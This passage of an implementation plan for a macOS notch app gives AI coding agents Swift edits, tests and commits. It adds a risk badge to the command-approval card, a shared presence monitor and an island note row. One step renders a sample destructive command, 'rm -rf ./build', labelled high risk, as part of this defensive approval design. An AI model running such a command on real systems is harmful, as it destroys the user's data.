// island is a mock around them: a black shape of the expanded size (`islandSize`) with the card where IslandContentView puts it (10 pt in, 42 pt down, 98 pt high), and no header.
//   bash scripts/render-approval-card.sh --out approval-card.png [--scale 2] [--command "npm test"] [--line "Runs the project's own test or build script."] [--risk high]
// Run it through the .sh: it compiles the whole app but NotchBuddyApp.swift, and runs in a home folder of its own.

```

**Edit `scripts/render-approval-card.swift`** (the find text occurs exactly once)

Find:

```swift

    @MainActor static func main() {
        var out = "approval-card.png", scale = 2.0, command = "npm test"
        var it = CommandLine.arguments.dropFirst().makeIterator()
        while let k = it.next() {
```

Replace with:

```swift

    @MainActor static func main() {
        var out = "approval-card.png", scale = 2.0, command = "npm test", line = "", risk = ""
        var it = CommandLine.arguments.dropFirst().makeIterator()
        while let k = it.next() {
```

**Edit `scripts/render-approval-card.swift`** (the find text occurs exactly once)

Find:

```swift
            case "--scale": scale = Double(it.next() ?? "") ?? scale
            case "--command": command = it.next() ?? command
            default: FileHandle.standardError.write(Data("unknown argument \(k)\n".utf8)); exit(2)
            }
```

Replace with:

```swift
            case "--scale": scale = Double(it.next() ?? "") ?? scale
            case "--command": command = it.next() ?? command
            case "--line": line = it.next() ?? line
            case "--risk": risk = it.next() ?? risk
            default: FileHandle.standardError.write(Data("unknown argument \(k)\n".utf8)); exit(2)
            }
```

**Edit `scripts/render-approval-card.swift`** (the find text occurs exactly once)

Find:

```swift
        state.tasks = [task]
        state.focusId = task.id
        state.pendingApproval = ApprovalInfo(sessionId: "render", tool: "Bash", command: command, inputKey: "", pillId: task.id)

        let (islandW, islandH) = islandSize(mode: .expanded, view: .approval)
```

Replace with:

```swift
        state.tasks = [task]
        state.focusId = task.id
        state.pendingApproval = ApprovalInfo(sessionId: "render", tool: "Bash", command: command, inputKey: "", pillId: task.id, risk: risk, line: line)

        let (islandW, islandH) = islandSize(mode: .expanded, view: .approval)
```

**Edit `scripts/render-approval-card.sh`** (the find text occurs exactly once)

Find:

```bash
#!/usr/bin/env bash
# Draws the approval card of the island (ApprovalView) with the big cat beside it into a PNG, without launching NotchMeow (see scripts/render-approval-card.swift).
#   bash scripts/render-approval-card.sh --out approval-card.png [--scale 2] [--command "npm test"]
# ApprovalView reads the app's AppState, so this script compiles every file of the app except NotchBuddyApp.swift (the app's own @main): about two minutes. AppState is made
# (it reads UserDefaults, which for this tool is a domain of its own, and ~/.claude/settings.json, which is in the empty home folder below: scripts/render-home-guard.sh points
```

Replace with:

```bash
#!/usr/bin/env bash
# Draws the approval card of the island (ApprovalView) with the big cat beside it into a PNG, without launching NotchMeow (see scripts/render-approval-card.swift).
#   bash scripts/render-approval-card.sh --out approval-card.png [--scale 2] [--command "npm test"] [--line "..."] [--risk high]
# ApprovalView reads the app's AppState, so this script compiles every file of the app except NotchBuddyApp.swift (the app's own @main): about two minutes. AppState is made
# (it reads UserDefaults, which for this tool is a domain of its own, and ~/.claude/settings.json, which is in the empty home folder below: scripts/render-home-guard.sh points
```

**Edit `tests/HookOriginWiringTests.swift`** (the find text occurs exactly once)

Find:

```swift
        CT.check("the three notes come from the rule", count("HookOrigin.note(", in: hooks), 3)
        CT.check("no note is spelled in the server", count("Handled in ", in: hooks) + count("Still waiting in ", in: hooks), 0)
        CT.checkTrue("the approval keeps where it came from, and the notes use it", hooks.contains("subagentId: askedBy, host: host)") && hooks.contains("HookOrigin.note(host: pending.host, stillWaiting: false)") && types.contains("var host: String = \"VS Code\""))

        CT.section("a terminal session's pill brings its terminal forward")
```

Replace with:

```swift
        CT.check("the three notes come from the rule", count("HookOrigin.note(", in: hooks), 3)
        CT.check("no note is spelled in the server", count("Handled in ", in: hooks) + count("Still waiting in ", in: hooks), 0)
        CT.checkTrue("the approval keeps where it came from, and the notes use it", hooks.contains("subagentId: askedBy, host: host,") && hooks.contains("HookOrigin.note(host: pending.host, stillWaiting: false)") && types.contains("var host: String = \"VS Code\""))

        CT.section("a terminal session's pill brings its terminal forward")
```

- [ ] **Step 6: Run the pins, the neighbours' tests and the build**

Run: `bash scripts/test-sidekick-wiring.sh 2>&1 | tail -1; bash scripts/test-hook-origin-wiring.sh 2>&1 | tail -1`
Expected: two lines, each `All tests passed.`

```bash
xcodebuild -project NotchBuddy/NotchBuddy.xcodeproj -scheme NotchBuddy -configuration Debug -derivedDataPath NotchBuddy/build build CODE_SIGNING_ALLOWED=NO 2>&1 | tail -3
```

Expected: `** BUILD SUCCEEDED **`.

- [ ] **Step 7: Draw the card three ways and look at it**

```bash
mkdir -p "${TMPDIR:-/tmp}/f1-mac-1"
bash scripts/render-approval-card.sh --out "${TMPDIR:-/tmp}/f1-mac-1/approval-high.png" --command "rm -rf ./build" --risk high --line "Deletes build and everything inside it."
bash scripts/render-approval-card.sh --out "${TMPDIR:-/tmp}/f1-mac-1/approval-medium.png" --command "git push origin main" --risk medium --line "Sends commits to a remote."
bash scripts/render-approval-card.sh --out "${TMPDIR:-/tmp}/f1-mac-1/approval-plain.png" --command "npm test"
```

Each compiles the whole app (about two minutes) and ends `wrote …`. Open the three PNGs with the file reader and say in one sentence what each shows. Expected: the first has the grey line under the command **and** an orange `High risk` capsule at the right end of the first row, all three rows and the buttons inside the card; the second has the grey line and no badge; the third is the card exactly as it shipped (no line, no badge). A card whose content leaves the rounded card is a failed step: stop and report. (The dry run read the first picture: the four rows end with the buttons a few points above the card's lower edge.)

- [ ] **Step 8: Commit**

```bash
git rev-parse --show-toplevel && git branch --show-current   # the worktree's folder and f1/mac-sidekick: stop if either is wrong
MSG="$(mktemp "${TMPDIR:-/tmp}/f1-mac-msg.XXXXXX")"
cat > "$MSG" <<'EOF'
feat(sidekick): one grey line and a High risk badge on the permission card

The card is as it shipped plus the sidekick's fixed sentence under the command and, on a high-risk request, a small orange badge and the cat's existing surprised emote; the buttons and the rule that only a click answers are untouched.

Co-Authored-By: Claude Haiku 5.5 <noreply@anthropic.com>
EOF
git add NotchBuddy/Sources/App/IslandTypes.swift NotchBuddy/Sources/App/HookServer.swift NotchBuddy/Sources/App/IslandViewContent.swift NotchBuddy/Sources/App/Sidekick.swift scripts/render-approval-card.swift scripts/render-approval-card.sh tests/SidekickWiringTests.swift tests/HookOriginWiringTests.swift
git commit -F "$MSG"
```

---

### Task 12: One `PresenceMonitor` for the desktop cat and the sidekick, and the idle tick

**Agent:** `nm-implementer-deep` (**Sonnet 5.5, high: CLAUDE.md trigger 1**, observers of system notifications and their main-actor isolation, and a change to a controller whose tests must stay green).

**Files:**
- Create: `NotchBuddy/Sources/App/PresenceMonitor.swift`
- Modify: `NotchBuddy/Sources/App/DesktopCatController.swift`, `NotchBuddy/Sources/App/Sidekick.swift`, `NotchBuddy/Sources/App/IslandWindowController.swift` (`pollFrame`), `tests/DesktopCatWiringTests.swift`, `tests/SidekickWiringTests.swift`, `NotchBuddy/NotchBuddy.xcodeproj/project.pbxproj` (regenerated by `xcodegen`)

**Interfaces:**
- Consumes: Task 6's `SKPresenceFlags` (`set(_:_:)`, `Event`), Task 9's `SidekickEngine.presenceEvent(_:)` and `tick()`; `DesktopCatController.visibility` (`DesktopCatVisibility`) and its `start()`; `IslandWindowController.pollFrame()` (60 Hz on screen, 10 Hz hidden, owned by `IslandPoller`).
- Produces: `PresenceMonitor` (`shared`, `Event`, `locked`, `displayOff`, `asleep`, `subscribe(_:_:)`, `start()`, `idleSeconds()`), `Sidekick.tick()`.

The Mac's own notifications for a lock, a sleep and a dark display are observed **once**. `DesktopCatController` already observed four of them (it hides the cat while the screen is locked or the displays sleep); they move into one shared `PresenceMonitor`, which the desktop cat and the sidekick both subscribe to, and it adds the system's `willSleep` and `didWake` (the sidekick needs them; the desktop cat ignores them). `SKPresenceFlags` decides what counts as a change, so a lock that arrives as two notifications is one lock (an improvement over the old code, where either notification's unlock cleared the cat's flag even while the other still held). **Nothing here polls:** every event is a notification; the idle time is one cheap system call, `CGEventSource.secondsSinceLastEventType`, that needs no permission and is read only by the engine, on a tick the island's poll already has (`Sidekick.tick()` from `pollFrame`: at most every 5 s, every second while the user is away by idle, only while an agent has a live session), on a hook event and on an unlock. `IslandPoller` is not touched: hidden, the island's poll stays at 10 Hz and the hidden island costs what it cost. The desktop cat's behaviour is unchanged, and its wiring test follows the move.

- [ ] **Step 1: Write the failing pins**

One pin of `DesktopCatWiringTests` reads the controller for the observers it no longer holds; it now reads the monitor. The sidekick's wiring test gains the pins of this task: the monitor observes once and has no timer, both subscribe and neither observes the notifications itself, the idle time is read in one place, the island's poll gives the sidekick one tick and `IslandPoller` is untouched, and the engine's tick returns early when a sample is not due.

**Edit `tests/DesktopCatWiringTests.swift`** (the find text occurs exactly once)

Find:

```swift
        CT.checkTrue("a slow frame does not slow the cat down: dt is held to 0.25 s, not the island's 0.05 s", count("maxDt: 0.25", in: ctl) == 2)
        CT.checkTrue("the Debug-only cat panel has a Desktop section, compiled out of Release and App Store, with its own marker", source("CatDevPanel.swift").contains("DesktopCatDevView()") && source("DesktopCatDevPanel.swift").contains("#if DEBUG && !APPSTORE") && source("DesktopCatDevModel.swift").contains("#if DEBUG && !APPSTORE") && source("DesktopCatDevModel.swift").contains("static let marker = \"NM_CAT_DEV_DESKTOP\""))
        CT.checkTrue("hidden is the screens asleep, the session locked or the window covered", ctl.contains("screensDidSleepNotification") && ctl.contains("com.apple.screenIsLocked") && ctl.contains("occlusionState.contains(.visible)"))
        let showBody = ctl.components(separatedBy: "private func show()").dropFirst().first?.components(separatedBy: "private func hide()").first ?? ""
        CT.checkTrue("show() re-reads the panel's real occlusion state a turn later (AppKit updates it asynchronously) and retargets", showBody.contains("DispatchQueue.main.async") && showBody.contains("occlusionState.contains(.visible)") && showBody.contains("visibilityChanged()"))
```

Replace with:

```swift
        CT.checkTrue("a slow frame does not slow the cat down: dt is held to 0.25 s, not the island's 0.05 s", count("maxDt: 0.25", in: ctl) == 2)
        CT.checkTrue("the Debug-only cat panel has a Desktop section, compiled out of Release and App Store, with its own marker", source("CatDevPanel.swift").contains("DesktopCatDevView()") && source("DesktopCatDevPanel.swift").contains("#if DEBUG && !APPSTORE") && source("DesktopCatDevModel.swift").contains("#if DEBUG && !APPSTORE") && source("DesktopCatDevModel.swift").contains("static let marker = \"NM_CAT_DEV_DESKTOP\""))
        CT.checkTrue("hidden is the screens asleep, the session locked or the window covered: the first two come from the shared PresenceMonitor, which observes the Mac's notifications once", source("PresenceMonitor.swift").contains("screensDidSleepNotification") && source("PresenceMonitor.swift").contains("com.apple.screenIsLocked") && ctl.contains("PresenceMonitor.shared.subscribe(\"desktopCat\")") && !ctl.contains("screensDidSleepNotification") && !ctl.contains("com.apple.screenIsLocked") && ctl.contains("occlusionState.contains(.visible)"))
        let showBody = ctl.components(separatedBy: "private func show()").dropFirst().first?.components(separatedBy: "private func hide()").first ?? ""
        CT.checkTrue("show() re-reads the panel's real occlusion state a turn later (AppKit updates it asynchronously) and retargets", showBody.contains("DispatchQueue.main.async") && showBody.contains("occlusionState.contains(.visible)") && showBody.contains("visibilityChanged()"))
```

**Edit `tests/SidekickWiringTests.swift`** (the find text occurs exactly once)

Find:

```swift
        CT.checkTrue("the badge is not a button: nothing in the sidekick answers a request", !source("Sidekick.swift").contains("sendApprovalDecision") && source("IslandViewContent.swift").contains("struct RiskBadge: View") && !cardText.contains("Button(action") )

        CT.section("the sidekick only reads: it answers nothing, starts no timer of its own and logs nothing")
        let files = ["Sidekick.swift", "SidekickStore.swift"]
        for f in files {
            let t = source(f)
```

Replace with:

```swift
        CT.checkTrue("the badge is not a button: nothing in the sidekick answers a request", !source("Sidekick.swift").contains("sendApprovalDecision") && source("IslandViewContent.swift").contains("struct RiskBadge: View") && !cardText.contains("Button(action") )

        CT.section("away and back: one set of observers for the Mac's notifications, and the idle time on a tick that already exists")
        let monitor = source("PresenceMonitor.swift"), desktop = source("DesktopCatController.swift"), window = source("IslandWindowController.swift")
        CT.checkTrue("the monitor observes lock, sleep and the displays, once, and has no timer and no poll", monitor.contains("screensDidSleepNotification") && monitor.contains("willSleepNotification") && monitor.contains("com.apple.screenIsLocked") && monitor.contains("guard !started else { return }") && !monitor.contains("Timer") && !monitor.contains("asyncAfter") && !monitor.contains("repeats"))
        CT.checkTrue("the desktop cat and the sidekick both subscribe to it, and neither observes those notifications itself", desktop.contains("PresenceMonitor.shared.subscribe(\"desktopCat\")") && center.contains("PresenceMonitor.shared.subscribe(\"sidekick\")") && !center.contains("screensDidSleep") && !center.contains("screenIsLocked"))
        CT.checkTrue("the idle time is read in one place, the engine's sample, through the monitor", count("PresenceMonitor.idleSeconds()", in: center) == 1 && count("idleSeconds()", in: source("SidekickEngine.swift")) == 1)
        CT.checkTrue("the island's own poll gives the sidekick a tick, once, before it does anything else with the pointer", count("Sidekick.shared.tick()", in: window) == 1 && at("Sidekick.shared.tick()", in: window) > at("private func pollFrame()", in: window))
        CT.checkTrue("the poll itself is not changed: hidden 10 Hz, visible 60 Hz (IslandPoller is untouched)", !source("IslandPoller.swift").contains("Sidekick"))
        CT.checkTrue("the engine's tick returns before it looks at the ledger when a sample is not due", source("SidekickEngine.swift").contains("now - last < SidekickIdle.awayMs { return }"))

        CT.section("the sidekick only reads: it answers nothing, starts no timer of its own and logs nothing")
        let files = ["Sidekick.swift", "SidekickStore.swift", "SidekickEngine.swift", "PresenceMonitor.swift"]
        for f in files {
            let t = source(f)
```

- [ ] **Step 2: Run the pins to make them fail**

Run: `bash scripts/test-cat-desktop-wiring.sh 2>&1 | grep -E "✗|passed|failed"; bash scripts/test-sidekick-wiring.sh 2>&1 | grep -E "✗|passed|failed"`
Expected: FAIL: `✗ hidden is the screens asleep, the session locked or the window covered…` and the new pins of the sidekick's wiring test, each program ending `N test(s) failed.`.

- [ ] **Step 3: Write the monitor**

**Create `NotchBuddy/Sources/App/PresenceMonitor.swift`**

```swift
import AppKit
import CoreGraphics

// Whether the user is at the computer: the Mac's own notifications for a lock, a sleep and a display that goes dark, observed ONCE and shared. The desktop cat (it hides while the screen is locked or the
// displays sleep) and the sidekick (away and back) both read the events, so there is one set of observers and neither has its own. Nothing here polls: every event is a notification the system
// sends. The idle time is not a notification: `idleSeconds()` is one cheap read that the sidekick asks for on a tick the island already has (`SidekickIdle`). Pure flags (`SKPresenceFlags`)
// decide what counts as a change, so a lock that arrives as two notifications is one lock.

@MainActor
final class PresenceMonitor {
    static let shared = PresenceMonitor()

    typealias Event = SKPresenceFlags.Event

    private var flags = SKPresenceFlags()
    private var listeners: [(id: String, handler: @MainActor (Event) -> Void)] = []
    private var tokens: [(center: NotificationCenter, token: NSObjectProtocol)] = []
    private var started = false

    /// The screen is locked, or the session was switched away.
    var locked: Bool { flags.locked }
    /// The displays are asleep.
    var displayOff: Bool { flags.displayOff }
    /// The Mac is asleep.
    var asleep: Bool { flags.asleep }

    /// Tells `handler` about every change from now on. One listener per `id`: subscribing again replaces it.
    func subscribe(_ id: String, _ handler: @escaping @MainActor (Event) -> Void) {
        listeners.removeAll { $0.id == id }
        listeners.append((id, handler))
    }

    /// Starts watching. Called once, at launch; calling it again does nothing.
    func start() {
        guard !started else { return }
        started = true
        let ws = NSWorkspace.shared.notificationCenter, dc = DistributedNotificationCenter.default()
        observe(ws, NSWorkspace.screensDidSleepNotification) { $0.set(.display, true) }
        observe(ws, NSWorkspace.screensDidWakeNotification) { $0.set(.display, false) }
        observe(ws, NSWorkspace.willSleepNotification) { $0.set(.system, true) }
        observe(ws, NSWorkspace.didWakeNotification) { $0.set(.system, false) }
        observe(ws, NSWorkspace.sessionDidResignActiveNotification) { $0.set(.session, true) }
        observe(ws, NSWorkspace.sessionDidBecomeActiveNotification) { $0.set(.session, false) }
        observe(dc, Notification.Name("com.apple.screenIsLocked")) { $0.set(.screenLock, true) }
        observe(dc, Notification.Name("com.apple.screenIsUnlocked")) { $0.set(.screenLock, false) }
    }

    private func observe(_ center: NotificationCenter, _ name: Notification.Name, _ change: @escaping @MainActor (PresenceMonitor) -> Void) {
        let token = center.addObserver(forName: name, object: nil, queue: .main) { [weak self] _ in
            MainActor.assumeIsolated { if let self { change(self) } }
        }
        tokens.append((center, token))
    }

    private func set(_ source: SKPresenceFlags.Source, _ on: Bool) {
        guard let event = flags.set(source, on) else { return }
        for l in listeners { l.handler(event) }
    }

    /// How many seconds since the last keyboard or mouse input of this session. It needs no permission and is one cheap system call; it is asked on an existing tick, never on a timer of its own.
    static func idleSeconds() -> Double {
        CGEventSource.secondsSinceLastEventType(.combinedSessionState, eventType: CGEventType(rawValue: ~0)!)
    }
}
```

- [ ] **Step 4: Move the desktop cat's observers into it, and subscribe the sidekick**

**Edit `NotchBuddy/Sources/App/DesktopCatController.swift`** (the find text occurs exactly once)

Find:

```swift
            self.send(.screensChanged)
        }
        let ws = NSWorkspace.shared.notificationCenter
        observe(ws, NSWorkspace.screensDidSleepNotification) { [weak self] in self?.visibility.screensAsleep = true; self?.visibilityChanged() }
        observe(ws, NSWorkspace.screensDidWakeNotification) { [weak self] in self?.visibility.screensAsleep = false; self?.visibilityChanged() }
        observe(ws, NSWorkspace.sessionDidResignActiveNotification) { [weak self] in self?.visibility.locked = true; self?.visibilityChanged() }
        observe(ws, NSWorkspace.sessionDidBecomeActiveNotification) { [weak self] in self?.visibility.locked = false; self?.visibilityChanged() }
        observe(ws, NSWorkspace.activeSpaceDidChangeNotification) { [weak self] in self?.occlusionChanged() }
        let dc = DistributedNotificationCenter.default()
        observe(dc, Notification.Name("com.apple.screenIsLocked")) { [weak self] in self?.visibility.locked = true; self?.visibilityChanged() }
        observe(dc, Notification.Name("com.apple.screenIsUnlocked")) { [weak self] in self?.visibility.locked = false; self?.visibilityChanged() }
    }

```

Replace with:

```swift
            self.send(.screensChanged)
        }
        observe(NSWorkspace.shared.notificationCenter, NSWorkspace.activeSpaceDidChangeNotification) { [weak self] in self?.occlusionChanged() }
        // The screen locked or the displays asleep hide the cat. The Mac's notifications are observed once, by the PresenceMonitor the sidekick shares (a lock that comes as two notifications is one event).
        PresenceMonitor.shared.subscribe("desktopCat") { [weak self] event in
            guard let self else { return }
            switch event {
            case .lock: self.visibility.locked = true
            case .unlock: self.visibility.locked = false
            case .displayOff: self.visibility.screensAsleep = true
            case .displayOn: self.visibility.screensAsleep = false
            case .sleep, .wake: return
            }
            self.visibilityChanged()
        }
        PresenceMonitor.shared.start()
    }

```

**Edit `NotchBuddy/Sources/App/Sidekick.swift`** (the find text occurs exactly once)

Find:

```swift
        env.ownCardShown = { let app = AppState.shared; return app.pendingApproval != nil && app.mode == .expanded && app.view == .approval }
        env.ratelimited = { AppState.shared.tasks.contains { $0.state == .ratelimit } }
        engine = SidekickEngine(store: .shared, clock: clock, env: env, codex: Self.codexEnabled)
        // A change of a setting (the switch, Unmute) decides again what may show.
        SidekickStore.shared.$settings.dropFirst().sink { [weak self] _ in MainActor.assumeIsolated { self?.engine.envChanged() } }.store(in: &cancellables)
```

Replace with:

```swift
        env.ownCardShown = { let app = AppState.shared; return app.pendingApproval != nil && app.mode == .expanded && app.view == .approval }
        env.ratelimited = { AppState.shared.tasks.contains { $0.state == .ratelimit } }
        env.idleSeconds = { PresenceMonitor.idleSeconds() }
        engine = SidekickEngine(store: .shared, clock: clock, env: env, codex: Self.codexEnabled)
        // A lock, a sleep or a dark display, from the monitor the desktop cat shares: no observers of its own.
        PresenceMonitor.shared.subscribe("sidekick") { [weak self] event in self?.engine.presenceEvent(event) }
        PresenceMonitor.shared.start()
        // A change of a setting (the switch, Unmute) decides again what may show.
        SidekickStore.shared.$settings.dropFirst().sink { [weak self] _ in MainActor.assumeIsolated { self?.engine.envChanged() } }.store(in: &cancellables)
```

**Edit `NotchBuddy/Sources/App/Sidekick.swift`** (the find text occurs exactly once)

Find:

```swift
    func approvalAnswered(agentId: String, sessionId: String) { engine.approvalAnswered(agentId: agentId, sessionId: sessionId) }

    /// The agents that have a live session (one that has not ended): the pills a drop may hand a path to.
    var liveAgents: Set<String> { engine.liveAgents }
```

Replace with:

```swift
    func approvalAnswered(agentId: String, sessionId: String) { engine.approvalAnswered(agentId: agentId, sessionId: sessionId) }

    /// A tick the island already has: `IslandWindowController.pollFrame`. The engine reads the idle time only when a sample is due (see `SidekickIdle`), so most ticks do nothing.
    func tick() { engine.tick() }

    /// The agents that have a live session (one that has not ended): the pills a drop may hand a path to.
    var liveAgents: Set<String> { engine.liveAgents }
```

**Edit `NotchBuddy/Sources/App/IslandWindowController.swift`** (the find text occurs exactly once)

Find:

```swift
            AppState.shared.mousePosition = newPos
        }

        // AppState can hide the island by itself (last task ended): keep the FSM in step.
```

Replace with:

```swift
            AppState.shared.mousePosition = newPos
        }

        // The sidekick asks the OS for the idle time on this tick when a sample is due (at most every 5 s, only while an agent has a live session): no timer or monitor of its own.
        Sidekick.shared.tick()

        // AppState can hide the island by itself (last task ended): keep the FSM in step.
```

- [ ] **Step 5: Run every test the move could touch, and the build**

Run: `for s in test-sidekick-wiring test-sidekick-engine test-cat-desktop-wiring test-cat-desktop-pacer test-cat-desktop-trip test-island-wing-wiring test-island-poller test-cat-wiring test-hook-origin-wiring; do printf '%-34s' $s; bash scripts/$s.sh 2>&1 | tail -1; done`
Expected: nine lines; eight end `All tests passed.` and `test-island-poller` ends `IslandPoller: visible 59 Hz, hidden 10 Hz, shown again 60 Hz` (the poll's own rates, unchanged).

```bash
cd NotchBuddy && xcodegen > /dev/null && cd .. && xcodebuild -project NotchBuddy/NotchBuddy.xcodeproj -scheme NotchBuddy -configuration Debug -derivedDataPath NotchBuddy/build build CODE_SIGNING_ALLOWED=NO 2>&1 | tail -3
```

Expected: `** BUILD SUCCEEDED **`.

- [ ] **Step 6: Commit**

```bash
git rev-parse --show-toplevel && git branch --show-current   # the worktree's folder and f1/mac-sidekick: stop if either is wrong
MSG="$(mktemp "${TMPDIR:-/tmp}/f1-mac-msg.XXXXXX")"
cat > "$MSG" <<'EOF'
feat(sidekick): one PresenceMonitor for the desktop cat and the sidekick, and the idle sample on the island's own tick

The Mac's lock, sleep and display notifications are observed once and shared; the idle time is one cheap read taken on a tick the island already has, only while an agent is live. No new timer, no new poll.

Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>
EOF
git add NotchBuddy/Sources/App/PresenceMonitor.swift NotchBuddy/Sources/App/DesktopCatController.swift NotchBuddy/Sources/App/Sidekick.swift NotchBuddy/Sources/App/IslandWindowController.swift tests/DesktopCatWiringTests.swift tests/SidekickWiringTests.swift NotchBuddy/NotchBuddy.xcodeproj/project.pbxproj
git commit -F "$MSG"
```

---

### Task 13: The `.sidekick` row: a note in the island

**Agent:** `nm-implementer-deep` (**Sonnet 5.5, high: CLAUDE.md trigger 1**, AppKit and SwiftUI with the island's expansion, its window's typing and pointer, and a refactor of shipping routes).

**Files:**
- Create: `NotchBuddy/Sources/App/SidekickView.swift`, `NotchBuddy/Sources/App/AgentTarget.swift`
- Modify: `NotchBuddy/Sources/App/IslandTypes.swift`, `NotchBuddy/Sources/App/IslandViewContent.swift`, `NotchBuddy/Sources/App/Sidekick.swift`, `NotchBuddy/Sources/App/AppDelegate.swift`, `NotchBuddy/Sources/App/IslandWindowController.swift`, `tests/SidekickWiringTests.swift`, `tests/HookOriginWiringTests.swift` (two pins follow the moved routes), `NotchBuddy/NotchBuddy.xcodeproj/project.pbxproj` (regenerated by `xcodegen`)
- Create (the owner's picture): `scripts/render-sidekick.sh`, `scripts/render-sidekick.swift`

**Interfaces:**
- Consumes: Task 9's `SidekickEngine` (`showing`, `dismiss()`, `act()`, `noteSeen()`), Task 7's `SKNote.rows` and `SidekickHost`, Task 10's `Sidekick`; `Notification.Name.hookExpand` and `.islandCollapse` (`IslandWindowController`), `CardBackground`, `PrimaryButton`, `SecondaryButton`, `IslandConst.viewLayouts`.
- Produces: `IslandView.sidekick` (and its `ViewLayout` row), `SidekickView`, `AgentTarget.bringForward(pillId:)`, `Sidekick.Inputs` (`typing`, `pointerOver`), `IslandWindowController.isTyping` and `.pointerInside`.

**How a note appears, with no new window.** It is a row in the island of its own (`.sidekick`, with its own `ViewLayout`; the `.note` view is the AI error flow and is not used). `Sidekick`'s `present` posts `.hookExpand` with `IslandView.sidekick`: the **same expansion a finished task uses** (a hidden or compact island opens on it, an island already open on the overview or the empty view switches to it). The engine only presents a note where `SidekickHost.canHost` says the user is just looking (never over a card, a question, the chat, a mail draft, the drop flow or Settings; it is held and dropped silently otherwise), and not while the user is typing in the island (`isTyping`: the island's panel is key and a text field is being edited). It goes by itself: when its time is up (20 s, 45 s for a recap; ten seconds more while the pointer is on the island) `retract` puts the island back (the overview, folded if the note had opened it; the fold waits one turn so a note that replaces this one does not make the island blink). **OK, ×, and Not now are one action and count as a dismissal; Show me brings the agent's app forward and is not one.** The card is 98 pt high and never grows: one sentence gets a title and two lines; a recap of several agents has no title and one row for each agent (`SKNote.rows`, at most three, the third saying how many more). A note shows words and buttons only: it answers nothing, makes no sound and opens nothing but the island.

**The card's rows.** A recap shows at most 3 rows; a longer one is cut with "…" (`SKNote.rows`), so it always fits the fixed 98 pt of content (owner's answer, 2026-10-14). The note view's `.accessibilityIdentifier(Sidekick.marker)` also keeps the App Store/Release marker `NM_SIDEKICK_ENGINE_PRESENT` in every binary.

**`AgentTarget`.** "Show me" and, in Task 18, a drop on an agent's cat bring that agent's app forward by **the routes the pill's ↗ button has always used** (`OverviewView.openAgentTarget`: Claude Code's terminal or VS Code, Cursor, Codex, the first running terminal for Gemini and Antigravity, all but the VS Code route behind `#if !APPSTORE`). They move, byte for byte, into `AgentTarget` so there is one copy; the button calls it; two pins of the all-terminals wiring test read the new file. It brings an app to the front: it does not pick a tab, type, paste or send anything.

- [ ] **Step 1: Write the failing pins**

**Edit `tests/SidekickWiringTests.swift`** (the find text occurs exactly once)

Find:

```swift
        CT.checkTrue("the engine's tick returns before it looks at the ledger when a sample is not due", source("SidekickEngine.swift").contains("now - last < SidekickIdle.awayMs { return }"))

        CT.section("the sidekick only reads: it answers nothing, starts no timer of its own and logs nothing")
        let files = ["Sidekick.swift", "SidekickStore.swift", "SidekickEngine.swift", "PresenceMonitor.swift"]
        for f in files {
            let t = source(f)
```

Replace with:

```swift
        CT.checkTrue("the engine's tick returns before it looks at the ledger when a sample is not due", source("SidekickEngine.swift").contains("now - last < SidekickIdle.awayMs { return }"))

        CT.section("a note: its own row in the island, opened the way a finished task is, never a window of its own")
        let sidekickView = source("SidekickView.swift"), target = source("AgentTarget.swift"), delegate = source("AppDelegate.swift")
        CT.checkTrue("the island has a view of its own for it, with its own row, and the dispatcher shows it (the .note view is the AI error flow and is not used)", types.contains("case sidekick") && types.contains(".sidekick:  ViewLayout(") && view.contains("case .sidekick:  SidekickView(engine: Sidekick.shared.engine, state: state)") && !sidekickView.contains("view = .note"))
        CT.checkTrue("it opens with the notification a finished task uses, once, and only the sidekick's own file does", count("name: .hookExpand, object: IslandView.sidekick", in: center) == 1)
        CT.checkTrue("no window, no panel, no alert, no system notification: the island is the only place a note shows", ["Sidekick.swift", "SidekickEngine.swift", "SidekickView.swift", "SidekickStore.swift", "PresenceMonitor.swift"].allSatisfy { f in let t = source(f); return !t.contains("NSPanel") && !t.contains("NSWindow(") && !t.contains("NSAlert") && !t.contains("UserNotifications") && !t.contains("NSUserNotification") && !t.contains("NSSound") && !t.contains("SoundEngine") })
        CT.checkTrue("a note is hosted only where the user is just looking (SidekickHost), and the island's typing and pointer come from its window", center.contains("SidekickHost.canHost(expanded: app.mode == .expanded, view: app.view.rawValue)") && delegate.contains("Sidekick.shared.inputs.typing = ") && delegate.contains("Sidekick.shared.inputs.pointerOver = ") && window.contains("var isTyping: Bool") && window.contains("var pointerInside: Bool"))
        CT.checkTrue("OK, Not now and × are one action and count as a dismissal; Show me is not one", count("engine.dismiss()", in: sidekickView) == 3 && sidekickView.contains("if let shown = engine.act(), let agent = shown.agentId { AgentTarget.bringForward(pillId: agent) }"))
        CT.checkTrue("a note answers nothing and shows its words and buttons only", !sidekickView.contains("sendApprovalDecision") && !sidekickView.contains("HookServer"))
        CT.checkTrue("the pill's ↗ button and the sidekick use one set of routes: the five agent cases moved to AgentTarget, as they were", view.contains("case \"integration_claude\", \"agent_cursor\", \"agent_codex\", \"agent_gemini\", \"agent_antigravity\":\n            AgentTarget.bringForward(pillId: task.id)") && view.contains("private func openAgentTarget") && target.contains("com.microsoft.VSCode") && target.contains("com.todesktop.230313mzl4w4u92") && target.contains("com.openai.codex") && count("            #if !APPSTORE\n", in: target) == 4)
        CT.checkTrue("AgentTarget brings an app to the front and does nothing else: no paste, no key, no typing", !target.contains("CGEvent") && !target.contains("NSPasteboard") && !target.contains("keyDown") && !target.contains("AppleScript") && !target.contains("NSAppleScript"))

        CT.section("the sidekick only reads: it answers nothing, starts no timer of its own and logs nothing")
        let files = ["Sidekick.swift", "SidekickStore.swift", "SidekickEngine.swift", "PresenceMonitor.swift", "SidekickView.swift"]
        for f in files {
            let t = source(f)
```

**Edit `tests/HookOriginWiringTests.swift`** (the find text occurs exactly once)

Find:

```swift

    @MainActor static func main() {
        let hooks = source("HookServer.swift"), rules = source("HookOrigin.swift"), types = source("IslandTypes.swift"), app = source("AppState.swift"), view = source("IslandViewContent.swift")
        CT.section("the sources were read")
        CT.checkTrue("the five files are there", hooks.contains("final class HookServer") && rules.contains("enum HookOrigin") && types.contains("struct ApprovalInfo") && app.contains("final class AppState") && view.contains("private func openAgentTarget"))
```

Replace with:

```swift

    @MainActor static func main() {
        let hooks = source("HookServer.swift"), rules = source("HookOrigin.swift"), types = source("IslandTypes.swift"), app = source("AppState.swift"), view = source("IslandViewContent.swift"), target = source("AgentTarget.swift")
        CT.section("the sources were read")
